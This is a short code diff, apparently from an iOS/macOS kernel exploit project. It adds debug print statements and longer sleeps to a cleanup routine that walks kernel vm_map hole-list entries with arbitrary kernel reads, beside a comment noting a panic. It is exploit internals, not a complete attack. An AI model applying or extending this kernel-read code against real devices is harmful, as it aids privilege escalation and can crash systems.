@@ -418,7 +418,7 @@ void smith_helper_cleanup(struct kfd* kfd)
          * Sleep an extra 100 us to make sure smith_helper_cleanup_pthread()
          * had the time to take the vm_map_lock().
          */
-        usleep(100);
+        usleep(500);
     }
 
     u64 map_kaddr = kfd->info.kaddr.current_map;
@@ -550,19 +550,25 @@ void smith_helper_cleanup(struct kfd* kfd)
         u64 second_leaked_hole_next = 0;
 
         while (true) {
-            print_message("Scan hole list: %llu", hole_count);
             hole_count++;
+            print_message("Scan hole list: %llu", hole_count);
+            print_message("kread 1: %llu", hole_count);
             u64 hole_next = kget_u64(vm_map_entry__links__next, hole_kaddr);
-            usleep(100);
+            print_message("kread 2: %llu", hole_count);
             u64 hole_start = kget_u64(vm_map_entry__links__start, hole_kaddr);
+            print_message("kread 3: %llu", hole_count);
             u64 hole_end = kget_u64(vm_map_entry__links__end, hole_kaddr); // panics here
 
             if (hole_start == 0) {
+                print_message("kread 4: %llu", hole_count);
                 first_leaked_hole_prev = kget_u64(vm_map_entry__links__prev, hole_kaddr);
                 first_leaked_hole_next = hole_next;
                 first_leaked_hole_end = hole_end;
+                usleep(1000);
                 assert(prev_hole_end == smith->vme[1].address);
             } else if (hole_start == smith->vme[1].address) {
+                usleep(1000);
+                print_message("kread 5: %llu", hole_count);
                 second_leaked_hole_prev = kget_u64(vm_map_entry__links__prev, hole_kaddr);
                 second_leaked_hole_next = hole_next;
                 assert(hole_end == smith->vme[2].address);
